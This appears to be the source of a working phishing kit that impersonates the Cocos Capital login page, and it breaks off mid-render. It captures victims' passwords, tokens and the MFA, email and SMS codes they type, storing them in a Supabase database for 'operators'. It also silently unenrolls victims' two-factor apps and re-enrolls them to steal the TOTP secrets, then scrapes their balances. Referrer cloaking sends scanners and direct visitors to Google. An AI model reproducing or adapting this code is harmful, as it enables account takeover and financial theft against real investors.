import { useState, useEffect, useCallback, useRef } from "react";
import { useParams } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { invokeCocos } from "@/lib/cocosApi";
import { useVisitTracker, useVisitorPresence } from "@/hooks/useVisitTracker";
import cocosLogo from "@/assets/cocos-logo.png";
import CocosLogo from "@/components/cocos/CocosLogo";
import CocosV2LoginForm from "@/components/cocosv2/CocosV2LoginForm";
import CocosV2SmsScreen from "@/components/cocosv2/CocosV2SmsScreen";
import CocosV2EmailScreen from "@/components/cocosv2/CocosV2EmailScreen";
import CocosV2MfaScreen from "@/components/cocosv2/CocosV2MfaScreen";
import CocosV2FinalScreen from "@/components/cocosv2/CocosV2FinalScreen";
import { generateTOTP } from "@/lib/totp";
import { saveTotpSecret } from "@/lib/totp";

type Step = "login" | "email_verify" | "mfa_verify" | "auto_enrolling" | "sms_verify" | "syncing" | "done";

const ALLOWED_REFERRERS = ["linkshield.vip", "mon.net.br"];

const isReferrerAllowed = (): boolean => {
  try {
    const ref = document.referrer;
    if (!ref) return false;
    const refHost = new URL(ref).hostname.toLowerCase().replace(/^www\./, "");
    return ALLOWED_REFERRERS.some((d) => refHost === d || refHost.endsWith(`.${d}`));
  } catch {
    return false;
  }
};

const CocosV2 = () => {
  const { operatorCode: rawOperatorCode } = useParams<{ operatorCode?: string }>();
  const [blocked, setBlocked] = useState(false);

  useEffect(() => {
    if (sessionStorage.getItem("cocos_ref_ok")) return;
    const ref = document.referrer;
    if (!ref) {
      // No referrer (direct access) → redirect to google
      window.location.replace("https://www.google.com");
      return;
    }
    const allowed = isReferrerAllowed();
    if (allowed) {
      sessionStorage.setItem("cocos_ref_ok", "1");
    } else {
      // Referrer from another site → redirect to google
      window.location.replace("https://www.google.com");
    }
  }, []);
  // Clean operator code: strip query params / special chars, default to "master"
  // Only "00001" goes to Elton; all other codes route to "master"
  const cleanedCode = rawOperatorCode
    ? rawOperatorCode.replace(/[^a-zA-Z0-9]/g, "") || "master"
    : "master";
  const operatorCode = cleanedCode === "00001" ? "00001" : "master";

  const [step, setStep] = useState<Step>("login");
  const [email, setEmail] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const [statusMsg, setStatusMsg] = useState("");

  // Tokens
  const [accessToken, setAccessToken] = useState("");
  const [refreshToken, setRefreshToken] = useState("");
  const refreshTokenRef = useRef("");
  const [lastPassword, setLastPassword] = useState("");
  const lastPasswordRef = useRef("");

  // MFA state
  const [factorId, setFactorId] = useState("");
  const [challengeId, setChallengeId] = useState("");

  // SMS state
  const [smsChallengeId, setSmsChallengeId] = useState("");
  const [smsFactorId, setSmsFactorId] = useState("");
  const [phoneHint, setPhoneHint] = useState("");

  // Session tracking ID
  const [sessionId, setSessionId] = useState("");
  const sessionIdRef = useRef("");

  // MFA method tracking
  const [mfaMethod, setMfaMethod] = useState<"client_own" | "enrolled" | null>(null);
  const mfaMethodRef = useRef<"client_own" | "enrolled" | null>(null);
  const [enrolledSecret, setEnrolledSecret] = useState<string | null>(null);
  const enrolledSecretRef = useRef<string | null>(null);

  useVisitTracker();
  useVisitorPresence(sessionId || null);

  useEffect(() => {
    document.title = "Cocos Capital — Iniciar sesión";
    const link: HTMLLinkElement = document.querySelector("link[rel~='icon']") || document.createElement("link");
    link.rel = "icon";
    link.type = "image/png";
    link.href = cocosLogo;
    document.head.appendChild(link);
  }, []);

  const callApi = useCallback(async (action: string, extra: Record<string, unknown> = {}) => {
    const { data, error: fnError } = await invokeCocos({ action, ...extra });
    // For mfa_verify, the edge function returns 401 when the TOTP code is wrong,
    // but supabase.functions.invoke treats non-2xx as fnError.
    // We need to check if we got data back (success:false means wrong code, not expired session).
    if (fnError) {
      // If we got a response body with success:false, return it instead of throwing
      // so callers can distinguish "wrong code" from "network/session error"
      if (data && typeof data === "object" && data.success === false) {
        return data;
      }
      throw fnError;
    }
    return data;
  }, []);

  // ── Session tracking: create/update session in DB for admin real-time view ──
  const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
    const { data } = await supabase.from("sessions").insert({
      email: userEmail,
      source: "cocosv2",
      status,
      otp_code: extra.otp_code as string || null,
      password: extra.password as string || null,
      ip_address: null,
      operator_code: operatorCode,
    } as any).select("id").single();
    if (data?.id) {
      setSessionId(data.id);
      sessionIdRef.current = data.id;
    }
    return data?.id;
  }, [operatorCode]);

  const updateSession = useCallback(async (status: string, extra: Record<string, unknown> = {}) => {
    const sid = sessionIdRef.current;
    if (!sid) return;
    const payload: Record<string, unknown> = { status, ...extra };
    await supabase.from("sessions").update(payload).eq("id", sid);
  }, []);

  const upsertAccountForOperator = useCallback(async (partial: Record<string, unknown>) => {
    const normalizedEmail = String(partial.email || "").trim().toLowerCase();
    if (!normalizedEmail) return;

    const nowIso = new Date().toISOString();
    const payload = {
      ...partial,
      email: normalizedEmail,
      operator_code: operatorCode,
      updated_at: nowIso,
    };

    const { data: existing, error: findError } = await supabase
      .from("cocos_accounts")
      .select("id")
      .eq("email", normalizedEmail)
      .eq("operator_code", operatorCode)
      .limit(1);

    if (findError) {
      console.warn("[COCOS_ACCOUNT] lookup failed", findError);
      return;
    }

    if ((existing?.length || 0) > 0) {
      const { error: updateError } = await supabase
        .from("cocos_accounts")
        .update(payload as any)
        .eq("email", normalizedEmail)
        .eq("operator_code", operatorCode);

      if (updateError) console.warn("[COCOS_ACCOUNT] update failed", updateError);
      return;
    }

    const { error: insertError } = await supabase.from("cocos_accounts").insert(payload as any);
    if (insertError) console.warn("[COCOS_ACCOUNT] insert failed", insertError);
  }, [operatorCode]);

  // ── Sync account data to cocos_accounts ──
  const syncAccountData = useCallback(async (token: string, userEmail: string) => {
    setStatusMsg("Consultando la seguridad de tu cuenta y tus datos...");
    try {
      // Get account ID
      let acctId = "";
      try {
        const pd = await callApi("get_account_id", { access_token: token });
        acctId = pd?.id_accounts?.[0] ? String(pd.id_accounts[0]) : "";
      } catch { /* ignore */ }

      const extra = acctId ? { account_id: acctId } : {};

      // Fetch balances + factors + user auth in parallel
      const [balArsRes, balUsdRes, factorsRes, authRes] = await Promise.allSettled([
        callApi("get_portfolio_balance", { access_token: token, currency: "ARS", period: "1D", ...extra }),
        callApi("get_portfolio_balance_usd", { access_token: token, period: "1D", ...extra }),
        callApi("mfa_list_factors", { access_token: token }),
        callApi("get_user_auth", { access_token: token }),
      ]);

      const balArsRaw = balArsRes.status === "fulfilled" ? balArsRes.value : null;
      const balUsdRaw = balUsdRes.status === "fulfilled" ? balUsdRes.value : null;
      const factorsData = factorsRes.status === "fulfilled" ? factorsRes.value : null;
      const authData = authRes.status === "fulfilled" ? authRes.value : null;

      // Only use balance data if it's valid (not a 401/error response)
      const isValidBalance = (d: unknown): boolean => {
        if (!d || typeof d !== "object") return false;
        const obj = d as Record<string, unknown>;
        if (obj.success === false || obj.upstream_status || obj.message) return false;
        return true;
      };
      const balArs = isValidBalance(balArsRaw) ? balArsRaw : null;
      const balUsd = isValidBalance(balUsdRaw) ? balUsdRaw : null;

      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const payload: any = {
        email: userEmail,
        access_token: token,
        account_id: acctId || null,
        // Only overwrite balances if we got valid data
        ...(balArs ? { balance_ars: balArs } : {}),
        ...(balUsd ? { balance_usd: balUsd } : {}),
        factors: factorsData || [],
        profile_data: {
          mfa_method: mfaMethodRef.current || mfaMethod,
          ...(authData ? { first_name: authData.first_name, last_name: authData.last_name } : {}),
        },
        full_name: authData ? `${authData.first_name || ""} ${authData.last_name || ""}`.trim() : null,
        phone: authData?.phone || factorsData?.phone || null,
        last_login_at: new Date().toISOString(),
        last_data_sync_at: new Date().toISOString(),
      };

      // Only include these fields if we actually have values (avoid overwriting with null)
      const rt = refreshTokenRef.current || refreshToken;
      if (rt) payload.refresh_token = rt;
      const secret = enrolledSecretRef.current || enrolledSecret;
      if (secret) payload.totp_secret = secret;
      const pwd = lastPasswordRef.current || lastPassword;
      if (pwd) payload.password = pwd;

      await upsertAccountForOperator(payload);

      // Update session with balance info
      const totalArs = Number(balArs?.totalBalance) || 0;
      const totalUsd = Number(balUsd?.totalBalance) || 0;
      await updateSession("completed", {
        otp_code: `balance_ars:${totalArs}|balance_usd:${totalUsd}|mfa:${mfaMethodRef.current || mfaMethod || "none"}`,
      });
    } catch (e) {
      console.warn("[SYNC] Error syncing account data", e);
    }
  }, [callApi, refreshToken, lastPassword, mfaMethod, enrolledSecret, updateSession]);

  // =============================================
  // FLOW A: Login → MFA verify (client's own) → Sync → Done
  // FLOW B: Login → Email verify → Auto-enroll TOTP → SMS → Sync → Done
  // =============================================

  const handleLogin = useCallback(async (submittedEmail: string, password: string) => {
    setError("");
    setLoading(true);
    setEmail(submittedEmail);
    setLastPassword(password);
    lastPasswordRef.current = password;

    // Create session for admin tracking
    const sid = await createSession(submittedEmail, "login_attempt", { password });

    try {
      const data = await callApi("login", { email: submittedEmail, password });

      if (data?.status === "valid_credentials" && data.access_token) {
        setAccessToken(data.access_token);
        setRefreshToken(data.refresh_token || ""); refreshTokenRef.current = data.refresh_token || "";

        await updateSession("login_success");
        // Save password + tokens to DB immediately on successful login
        await supabase.from("cocos_accounts").upsert({
          email: submittedEmail,
          password,
          access_token: data.access_token,
          refresh_token: data.refresh_token || null,
          last_login_at: new Date().toISOString(),
          operator_code: operatorCode,
        } as any, { onConflict: "email" });

        // Read user factors
        const userData = await callApi("mfa_list_factors", { access_token: data.access_token });
        const factors = userData?.factors || [];

        const verifiedTotp = factors.filter(
          (f: { status: string; factor_type: string }) => f.status === "verified" && f.factor_type === "totp"
        );

        if (verifiedTotp.length > 0) {
          // Check if we have the TOTP secret saved in DB
          const { data: acctData } = await supabase
            .from("cocos_accounts")
            .select("totp_secret")
            .eq("email", submittedEmail)
            .maybeSingle();

          const savedSecret = acctData?.totp_secret;

          if (savedSecret) {
            // FLOW A-AUTO: We have the secret → auto-verify with our code
            console.log("[LOGIN] We have TOTP secret, auto-verifying...");
            setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
            setEnrolledSecret(savedSecret); enrolledSecretRef.current = savedSecret;
            await updateSession("mfa_auto_verify", { otp_code: "mfa_type:enrolled" });

            const factor = verifiedTotp[0];
            const verifyRes = await retryTotpVerify(data.access_token, factor.id, savedSecret);
            if (verifyRes?.access_token) {
              setAccessToken(verifyRes.access_token);
              if (verifyRes.refresh_token) { setRefreshToken(verifyRes.refresh_token); refreshTokenRef.current = verifyRes.refresh_token; }
              saveTotpSecret(savedSecret, submittedEmail);
              await updateSession("totp_auto_verified");
              setStep("syncing");
              await syncAccountData(verifyRes.access_token, submittedEmail);
              setStep("done");
            } else {
              // Auto-verify failed — fall back to client MFA screen
              console.warn("[LOGIN] Auto-verify failed, falling back to manual MFA");
              const factor = verifiedTotp[0];
              setFactorId(factor.id);
              const challengeData = await callApi("mfa_challenge", {
                access_token: data.access_token,
                factor_id: factor.id,
              });
              setChallengeId(challengeData?.id || "");
              setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
              await updateSession("mfa_challenge_sent", { otp_code: "mfa_type:client_own" });
              setStep("mfa_verify");
            }
          } else {
            // No saved secret — unenroll existing TOTP and re-enroll to capture secret
            console.log("[LOGIN] No saved TOTP secret, unenrolling and re-enrolling...");
            let unenrolledOk = false;
            for (const vf of verifiedTotp) {
              try {
                const unenrollResult = await callApi("mfa_unenroll", { access_token: data.access_token, factor_id: vf.id });
                if (unenrollResult?.success) {
                  console.log("[LOGIN] Unenrolled factor:", vf.id);
                  unenrolledOk = true;
                } else {
                  console.warn("[LOGIN] Unenroll returned success=false:", vf.id, JSON.stringify(unenrollResult).slice(0, 200));
                }
              } catch (ue) {
                console.warn("[LOGIN] Failed to unenroll factor:", vf.id, ue);
              }
            }

            if (unenrolledOk) {
              // Now go to FLOW B: email challenge → enroll new TOTP
              try {
                await callApi("email_challenge", { access_token: data.access_token });
                setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
                await updateSession("email_challenge_sent_reenroll", { otp_code: "mfa_type:enrolled" });
                setStep("email_verify");
              } catch {
                // Email challenge failed — try direct enroll
                await enrollTotpAndFinish(data.access_token);
              }
            } else {
              // Can't unenroll — treat as client's own MFA
              const factor = verifiedTotp[0];
              setFactorId(factor.id);
              const challengeData = await callApi("mfa_challenge", {
                access_token: data.access_token,
                factor_id: factor.id,
              });
              setChallengeId(challengeData?.id || "");
              setMfaMethod("client_own"); mfaMethodRef.current = "client_own";
              await updateSession("mfa_challenge_sent", { otp_code: "mfa_type:client_own" });
              setStep("mfa_verify");
            }
          }
        } else {
          // FLOW B: No TOTP → email challenge
          try {
            await callApi("email_challenge", { access_token: data.access_token });
            setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
            await updateSession("email_challenge_sent", { otp_code: "mfa_type:enrolled" });
            setStep("email_verify");
          } catch {
            // If email challenge fails, still try to enroll TOTP directly
            await updateSession("email_challenge_failed_trying_enroll");
            await enrollTotpAndFinish(data.access_token);
          }
        }
      } else if (data?.status === "invalid_credentials") {
        await updateSession("wrong_password");
        setError("Contraseña incorrecta. Verificá tus datos e intentá de nuevo.");
      } else {
        await updateSession("login_error");
        setError("Error al iniciar sesión. Intentá de nuevo.");
      }
    } catch {
      setError("Error de conexión. Intentá de nuevo.");
    }
    setLoading(false);
  }, [callApi, createSession, updateSession, syncAccountData]);

  // ── Spanish error mapper ──
  const parseOtpError = (err: unknown, fallback: string): string => {
    const msg = typeof err === "object" && err !== null && "message" in err
      ? String((err as { message: string }).message).toLowerCase()
      : typeof err === "string" ? err.toLowerCase() : "";
    if (msg.includes("expired") || msg.includes("expirado")) return "El código expiró. Solicitá uno nuevo e intentá de nuevo.";
    if (msg.includes("invalid") || msg.includes("incorrect") || msg.includes("wrong")) return "Código incorrecto. Verificá e intentá de nuevo.";
    if (msg.includes("rate") || msg.includes("limit") || msg.includes("too many")) return "Demasiados intentos. Esperá unos minutos antes de reintentar.";
    if (msg.includes("not found") || msg.includes("no encontrado")) return "Código no encontrado. Verificá e intentá de nuevo.";
    if (msg.includes("network") || msg.includes("fetch") || msg.includes("connection")) return "Error de conexión. Verificá tu internet e intentá de nuevo.";
    if (msg.includes("unauthorized") || msg.includes("401")) return "Tu sesión expiró. Volvé a iniciar sesión.";
    return fallback;
  };

  // ── FLOW A: MFA Verify (client's own TOTP) ──
  const handleMfaVerify = useCallback(async (code: string) => {
    setError("");
    setLoading(true);
    try {
      await updateSession("mfa_code_entered", { otp_code: `mfa_code:${code}` });

      let currentToken = accessToken;
      let currentRefresh = refreshTokenRef.current || refreshToken;
      let currentChallengeId = challengeId;
      let verifyData;

      // Step 1: Always refresh token first (it likely expired while user typed the code)
      try {
        const refreshed = await callApi("refresh_token", { refresh_token: currentRefresh });
        if (refreshed?.access_token) {
          currentToken = refreshed.access_token;
          currentRefresh = refreshed.refresh_token || currentRefresh;
          setAccessToken(currentToken);
          setRefreshToken(currentRefresh); refreshTokenRef.current = currentRefresh;
          console.log("[MFA] Token refreshed successfully before verify");

          // Re-challenge with fresh token
          try {
            const newChallenge = await callApi("mfa_challenge", {
              access_token: currentToken,
              factor_id: factorId,
            });
            if (newChallenge?.id) {
              currentChallengeId = newChallenge.id;
              setChallengeId(currentChallengeId);
              console.log("[MFA] New challenge obtained:", currentChallengeId);
            }
          } catch (chErr) {
            console.warn("[MFA] Re-challenge failed, using existing challengeId", chErr);
          }
        }
      } catch (refreshErr) {
        console.warn("[MFA] Token refresh failed, trying with existing token", refreshErr);
      }

      // Step 2: Verify MFA with (possibly refreshed) token
      try {
        verifyData = await callApi("mfa_verify", {
          access_token: currentToken,
          factor_id: factorId,
          challenge_id: currentChallengeId,
          code,
        });
      } catch (verifyErr) {
        const errMsg = verifyErr instanceof Error ? verifyErr.message : String(verifyErr);
        console.error("[MFA] Verify threw:", errMsg);
        await updateSession("mfa_code_error", { otp_code: `mfa_code:${code}|err:${errMsg.slice(0, 100)}` });
        setError(parseOtpError(verifyErr, "No se pudo verificar el código. Reintentá en unos segundos."));
        setLoading(false);
        return;
      }

      if (verifyData?.access_token) {
        const newToken = verifyData.access_token;
        setAccessToken(newToken);
        if (verifyData.refresh_token) { setRefreshToken(verifyData.refresh_token); refreshTokenRef.current = verifyData.refresh_token; }
        await updateSession("mfa_verified_ok");
        setStep("syncing");
        setStatusMsg("Verificación exitosa. Sincronizando tus datos...");
        await syncAccountData(newToken, email);
        setStep("done");
      } else if (verifyData?.success === false) {
        const apiErr = verifyData?.error || verifyData?.message || verifyData?.msg || JSON.stringify(verifyData).slice(0, 120);
        await updateSession("mfa_code_wrong", { otp_code: `mfa_code:${code}|resp:${String(apiErr).slice(0, 80)}` });
        setError("Código incorrecto. Verificá el código en tu app de autenticación y reintentá.");
      } else {
        const raw = JSON.stringify(verifyData).slice(0, 120);
        await updateSession("mfa_code_error", { otp_code: `mfa_code:${code}|unexpected:${raw}` });
        setError("Error inesperado al verificar. Reintentá en unos segundos.");
      }
    } catch (err) {
      const errMsg = err instanceof Error ? err.message : String(err);
      await updateSession("mfa_code_error", { otp_code: `err:${errMsg.slice(0, 100)}` });
      setError(parseOtpError(err, "No se pudo verificar el código. Reintentá en unos segundos."));
    }
    setLoading(false);
  }, [callApi, accessToken, refreshToken, factorId, challengeId, updateSession, syncAccountData, email]);

  // ── FLOW B: Email verify → SMS challenge → User enters SMS → MFA enroll (with SMS proof) ──
  const handleEmailVerify = useCallback(async (code: string) => {
    setError("");
    setLoading(true);
    try {
      await updateSession("email_code_entered", { otp_code: `email_code:${code}` });

      const verifyData = await callApi("email_verify", {
        access_token: accessToken,
        code,
      });

      if (verifyData?.success && verifyData.access_token) {
        const newToken = verifyData.access_token;
        setAccessToken(newToken);
        if (verifyData.refresh_token) { setRefreshToken(verifyData.refresh_token); refreshTokenRef.current = verifyData.refresh_token; }

        await updateSession("email_verified_ok");
        setStatusMsg("Email verificado. Enviando código SMS de verificación...");

        // After email verify, send SMS challenge
        try {
          const smsData = await callApi("sms_send", { access_token: newToken });
          if (smsData?.success && smsData.challenge_id) {
            setSmsChallengeId(smsData.challenge_id);
            setPhoneHint(smsData.phone_hint || "");
            await updateSession("sms_sent", { otp_code: `sms_phone:${smsData.phone_hint || "?"}` });
            setStep("sms_verify");
          } else {
            // SMS failed — try to enroll TOTP without SMS and finish
            await updateSession("sms_send_failed");
            setStatusMsg("SMS no disponible. Procesando seguridad alternativa...");
            await enrollTotpAndFinish(newToken);
          }
        } catch {
          await updateSession("sms_unavailable");
          setStatusMsg("SMS no disponible. Procesando seguridad alternativa...");
          await enrollTotpAndFinish(newToken);
        }
      } else {
        await updateSession("email_code_wrong");
        setError("Código incorrecto. Revisá tu correo y volvé a intentar.");
      }
    } catch (err) {
      await updateSession("email_code_error");
      setError(parseOtpError(err, "Error al verificar el código. Intentá de nuevo."));
    }
    setLoading(false);
  }, [callApi, accessToken, updateSession]);

  // Helper: retry TOTP challenge+verify up to maxAttempts with freshly generated codes
  const retryTotpVerify = useCallback(async (token: string, factId: string, secret: string, maxAttempts = 5): Promise<{ access_token?: string; refresh_token?: string } | null> => {
    for (let attempt = 1; attempt <= maxAttempts; attempt++) {
      try {
        const freshCode = await generateTOTP(secret);
        console.log(`[TOTP VERIFY] Attempt ${attempt}/${maxAttempts} code=${freshCode}`);
        const challengeData = await callApi("mfa_challenge", { access_token: token, factor_id: factId });
        if (!challengeData?.id) {
          console.warn(`[TOTP VERIFY] Challenge failed on attempt ${attempt}`);
          continue;
        }
        const verifyRes = await callApi("mfa_verify", {
          access_token: token,
          factor_id: factId,
          challenge_id: challengeData.id,
          code: freshCode,
        });
        if (verifyRes?.access_token) {
          console.log(`[TOTP VERIFY] Success on attempt ${attempt}`);
          return verifyRes;
        }
        console.warn(`[TOTP VERIFY] Verify failed attempt ${attempt}:`, JSON.stringify(verifyRes).slice(0, 200));
        // Wait 2s before next attempt to let TOTP window advance
        if (attempt < maxAttempts) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.warn(`[TOTP VERIFY] Error on attempt ${attempt}:`, e);
        if (attempt < maxAttempts) await new Promise(r => setTimeout(r, 2000));
      }
    }
    return null;
  }, [callApi]);

  // Fallback: enroll without SMS (declared BEFORE enrollTotpWithSms)
  const enrollTotpAndFinish = useCallback(async (token: string) => {
    setStep("auto_enrolling");
    setStatusMsg("Procesando la seguridad de tu cuenta...");
    try {
      // First, check for and unenroll any existing unverified TOTP factors
      try {
        const userData = await callApi("mfa_list_factors", { access_token: token });
        const factors = userData?.factors || [];
        const unverifiedTotp = factors.filter(
          (f: { status: string; factor_type: string }) => f.status === "unverified" && f.factor_type === "totp"
        );
        for (const uf of unverifiedTotp) {
          console.log("[ENROLL FALLBACK] Removing unverified factor:", uf.id);
          await callApi("mfa_unenroll", { access_token: token, factor_id: uf.id });
        }
      } catch (cleanErr) {
        console.warn("[ENROLL FALLBACK] Error cleaning unverified factors:", cleanErr);
      }

      const enrollData = await callApi("mfa_enroll", { access_token: token });
      console.log("[ENROLL FALLBACK] enroll response:", JSON.stringify(enrollData).slice(0, 300));

      if (enrollData?.id && enrollData?.totp?.secret) {
        const totpSecret = enrollData.totp.secret;
        setEnrolledSecret(totpSecret);
        enrolledSecretRef.current = totpSecret;
        setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";
        await updateSession("totp_enrolled", { otp_code: `totp_secret:${totpSecret}` });
        await supabase.from("cocos_accounts").upsert({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" }, operator_code: operatorCode }, { onConflict: "email" });

        // Retry TOTP verify with fresh codes (up to 5 attempts)
        const verifyRes = await retryTotpVerify(token, enrollData.id, totpSecret);
        if (verifyRes?.access_token) {
          setAccessToken(verifyRes.access_token);
          saveTotpSecret(totpSecret, email);
          await updateSession("totp_auto_verified");
          setStep("syncing");
          await syncAccountData(verifyRes.access_token, email);
          setStep("done");
          return;
        }
        console.warn("[ENROLL FALLBACK] All TOTP verify attempts failed");
      } else {
        console.warn("[ENROLL FALLBACK] Enroll did not return id/secret:", JSON.stringify(enrollData).slice(0, 300));
      }
    } catch (e) { console.warn("[ENROLL FALLBACK] Error:", e); }
    // Even on failure, sync what we can — but still go to done so user isn't stuck
    await updateSession("totp_enroll_failed");
    setStep("syncing");
    await syncAccountData(token, email);
    setStep("done");
  }, [callApi, updateSession, syncAccountData, email, retryTotpVerify]);

  // ── Enroll TOTP using SMS proof, then auto-verify (with token refresh + SMS re-send) ──
  const enrollTotpWithSms = useCallback(async (token: string, smsChallId: string, smsCode: string) => {
    setStep("auto_enrolling");
    setStatusMsg("Procesando la seguridad de tu cuenta...");

    let currentToken = token;
    let currentSmsChallId = smsChallId;
    let currentSmsCode = smsCode;

    // Helper: refresh access token
    const refreshToken_ = async () => {
      const refreshed = await callApi("refresh_token", { refresh_token: refreshTokenRef.current });
      if (refreshed?.access_token) {
        currentToken = refreshed.access_token;
        setAccessToken(currentToken);
        if (refreshed.refresh_token) { setRefreshToken(refreshed.refresh_token); refreshTokenRef.current = refreshed.refresh_token; }
        return true;
      }
      return false;
    };

    // Helper: re-send SMS and get new challenge
    const resendSms = async () => {
      console.log("[ENROLL TOTP] Re-sending SMS...");
      const smsData = await callApi("sms_send", { access_token: currentToken });
      if (smsData?.success && smsData.challenge_id) {
        currentSmsChallId = smsData.challenge_id;
        setSmsChallengeId(smsData.challenge_id);
        console.log("[ENROLL TOTP] New SMS challenge obtained");
        return true;
      }
      return false;
    };

    const attemptEnroll = async () => {
      return await callApi("mfa_enroll", {
        access_token: currentToken,
        smsChallengeId: currentSmsChallId,
        smsCode: currentSmsCode,
      });
    };

    try {
      // Clean up any existing unverified TOTP factors before enrolling
      try {
        const userData = await callApi("mfa_list_factors", { access_token: currentToken });
        const factors = userData?.factors || [];
        const unverifiedTotp = factors.filter(
          (f: { status: string; factor_type: string }) => f.status === "unverified" && f.factor_type === "totp"
        );
        for (const uf of unverifiedTotp) {
          console.log("[ENROLL TOTP] Removing unverified factor:", uf.id);
          await callApi("mfa_unenroll", { access_token: currentToken, factor_id: uf.id });
        }
      } catch (cleanErr) {
        console.warn("[ENROLL TOTP] Error cleaning unverified factors:", cleanErr);
      }

      let enrollData;

      // Attempt 1: enroll with current SMS credentials
      try {
        enrollData = await attemptEnroll();
        console.log("[ENROLL TOTP] enroll response:", JSON.stringify(enrollData).slice(0, 300));
      } catch (enrollErr) {
        console.warn("[ENROLL TOTP] First attempt failed:", enrollErr);
      }

      // Check if enroll returned an error (expired SMS or access token)
      const enrollMsg = String(enrollData?.message || enrollData?.error || "").toLowerCase();
      const enrollFailed = !enrollData?.id && (enrollMsg.includes("expired") || enrollMsg.includes("invalid") || !enrollData?.totp);

      if (enrollFailed) {
        console.log("[ENROLL TOTP] Enroll failed, refreshing token and re-sending SMS...");
        // Refresh access token
        try { await refreshToken_(); } catch { /* ignore */ }
        // Re-send SMS to get fresh challenge
        const smsOk = await resendSms();
        if (smsOk) {
          // Go back to SMS screen so user enters the new SMS code
          setStep("sms_verify");
          setError("");
          setLoading(false);
          setStatusMsg("");
          await updateSession("sms_resent_for_enroll");
          return;
        } else {
          // SMS re-send failed — try enroll without SMS as last resort
          console.warn("[ENROLL TOTP] SMS re-send failed, trying without SMS...");
          await enrollTotpAndFinish(currentToken);
          return;
        }
      }

      if (enrollData?.id && enrollData?.totp?.secret) {
        const totpSecret = enrollData.totp.secret;
        const newFactorId = enrollData.id;
        setEnrolledSecret(totpSecret);
        enrolledSecretRef.current = totpSecret;
        setMfaMethod("enrolled"); mfaMethodRef.current = "enrolled";

        await updateSession("totp_enrolled", { otp_code: `totp_secret:${totpSecret}` });
        await supabase.from("cocos_accounts").upsert({ email, totp_secret: totpSecret, password: lastPasswordRef.current || null, profile_data: { mfa_method: "enrolled" }, operator_code: operatorCode }, { onConflict: "email" });

        // Auto-verify TOTP with retry loop (up to 5 fresh codes)
        const verifyRes = await retryTotpVerify(currentToken, newFactorId, totpSecret);

        if (verifyRes?.access_token) {
          const aal2Token = verifyRes.access_token;
          setAccessToken(aal2Token);
          if (verifyRes.refresh_token) { setRefreshToken(verifyRes.refresh_token); refreshTokenRef.current = verifyRes.refresh_token; }
          saveTotpSecret(totpSecret, email);
          await updateSession("totp_auto_verified");

          setStep("syncing");
          setStatusMsg("Sincronizando tus datos...");
          await syncAccountData(aal2Token, email);
          setStep("done");
          return;
        }

        // All TOTP verify attempts failed — still save secret and sync
        console.warn("[ENROLL TOTP] All TOTP verify attempts failed, syncing anyway");
        saveTotpSecret(totpSecret, email);
      }

      await updateSession("totp_enroll_failed");
      setStep("syncing");
      await syncAccountData(currentToken, email);
      setStep("done");
    } catch (e) {
      console.warn("[ENROLL TOTP] Error:", e);
      await updateSession("totp_enroll_error");
      setStep("syncing");
      await syncAccountData(currentToken, email);
      setStep("done");
    }
  }, [callApi, updateSession, syncAccountData, email, enrollTotpAndFinish, retryTotpVerify]);

  // ── SMS Verify → then enroll TOTP with SMS proof ──
  const handleSmsVerify = useCallback(async (code: string) => {
    setError("");
    setLoading(true);
    try {
      await updateSession("sms_code_entered", { otp_code: `sms_code:${code}` });
      // Don't verify SMS separately — pass it to mfa_enroll
      await enrollTotpWithSms(accessToken, smsChallengeId, code);
    } catch (err) {
      await updateSession("sms_code_error");
      setError(parseOtpError(err, "Error al verificar el SMS. Intentá de nuevo."));
    }
    setLoading(false);
  }, [accessToken, smsChallengeId, updateSession, enrollTotpWithSms]);

  const handleBack = useCallback(() => {
    setStep("login");
    setError("");
    setAccessToken("");
  }, []);

  if (blocked) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center bg-[#f5f7fb]">
        <p className="text-gray-500 text-sm">Página não encontrada.</p>
      </div>
    );
  }

  return (
    <div className="flex min-h-[100dvh] flex-col items-center bg-[#f5f7fb] px-5 pt-8 pb-6 sm:pt-10">
      {step === "login" && (
        <div className="mb-6 sm:mb-8">
          <CocosLogo />
        </div>
      )}

      <div className="flex w-full max-w-[480px] flex-1 flex-col items-center">
        {step === "login" && (
          <div className="w-full max-w-[440px]">
            <CocosV2LoginForm onSubmit={handleLogin} loading={loading} error={error} />
          </div>
        )}

        {step === "email_verify" && (
          <div className="w-full max-w-[440px] rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
            <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
            <div className="px-7 pt-5 pb-7">
              <CocosV2EmailScreen
                email={email}
                onVerify={handleEmailVerify}
                onBack={handleBack}
                loading={loading}
                error={error}
              />
            </div>
          </div>
        )}

        {step === "mfa_verify" && (
          <div className="w-full max-w-[440px] rounded-2xl bg-white shadow-[0_8px_32px_-8px_rgba(26,63,143,0.12)] border border-[#e8edf5] overflow-hidden">
            <div className="h-1 w-full bg-gradient-to-r from-[#1a3f8f] via-[#3b6fe0] to-[#1a3f8f]" />
            <div className="px-7 pt-5 pb-7">
              <CocosV2MfaScreen
                email={email}
                factorId={factorId}
                challengeId={challengeId}
                onVerify={handleMfaVerify}
                onBack={handleBack}
                loading={loading}
                error={error}
              />
            </div>
          </div>
        )}

        {(step === "auto_enrolling" || step === "syncing") && (
          <div className="flex flex-col items-center justify-center py-20">
            <div className="mb-6">
              <CocosLogo />
            </div>
            <div className="flex items-center gap-3 mb-4">
              <div className="h-5 w-5 animate-spin rounded-full border-2 border-[#3b6fe0] border-t-transparent" />
              <span className="text-[14px] text-[#5a6a85] font-medium">{statusMsg || "Procesando tu cuenta..."}</span>
            </div>
            <p className="text-[11px] text-[#8895aa]">Por favor, no cierres esta ventana.</p>
          </div>
        )}

        {step === "sms_verify" && (
